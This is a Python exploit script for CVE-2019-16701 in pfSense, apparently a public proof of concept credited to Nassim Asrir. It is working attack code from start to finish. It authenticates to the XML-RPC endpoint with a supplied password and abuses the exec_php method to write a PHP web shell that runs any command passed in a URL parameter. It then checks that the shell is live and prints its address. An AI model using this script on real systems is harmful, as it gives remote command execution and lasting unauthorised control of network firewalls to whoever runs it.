#!/usr/bin/env python3

import argparse
import requests
import urllib.request
import urllib.error
import time
import sys
import string
import random

parser = argparse.ArgumentParser()
parser.add_argument("--rhost", help="Target Uri https://127.0.0.1")
parser.add_argument("--password", help="pfsense Password")
args = parser.parse_args()

rhost = args.rhost
password = args.password
print("")

print("[+] CVE-2019-16701 - Pfsense - Remote Code Injection")
print("")
print("[+] Author: Nassim Asrir")
print("")

command = "<?xml version='1.0' encoding='iso-8859-1'?>"
command += "<methodCall>"
command += "<methodName>pfsense.host_firmware_version</methodName>"
command += "<params>"
command += "<param><value><string>"+password+"</string></value></param>"
command += "</params>"
command += "</methodCall>"

print(command)

stage1 = rhost + "/xmlrpc.php"

try:
    # Use requests library for Python 3
    page = requests.post(stage1, data=command).text
except requests.RequestException as e:
    print("Error:", e)
    sys.exit(1)

print("[+] Checking Login Creds")

if "Authentication failed" in page:
    print("[-] Wrong password :(")
    sys.exit(0)
else:
    random_str = ''.join([random.choice(string.ascii_letters + string.digits) for _ in range(32)])

    print("[+] logged in successfully :)")
    print("[+] Generating random file "+random_str+".php")
    print("[+] Sending the exploit .....")

    command = "<?xml version='1.0' encoding='iso-8859-1'?>"
    command += "<methodCall>"
    command += "<methodName>pfsense.exec_php</methodName>"
    command += "<params>"
    command += "<param><value><string>"+password+"</string></value></param>"
    command += "<param><value><string>exec('echo \\'<pre> <?php $res = system($_GET[\"cmd\"]); echo $res ?> </pre>\\' > /usr/local/www/"+random_str+".php');</string></value></param>"
    command += "</params>"
    command += "</methodCall>"

    stage2 = rhost + "/xmlrpc.php"

    try:
        # Use requests library for Python 3
        page = requests.post(stage2, data=command).text
    except requests.RequestException as e:
        print("Error:", e)
        sys.exit(1)

final = rhost + "/" + random_str + ".php"

try:
    check = urllib.request.urlopen(final)
except urllib.error.URLError as e:
    print("Error:", e)
    sys.exit(1)

print("[+] Checking .....")

if check.getcode() == 200:
    print("[+] Yeah! You got your shell: " + final + "?cmd=id")
else:
    print("[+] Sorry :( Shell not found check the path")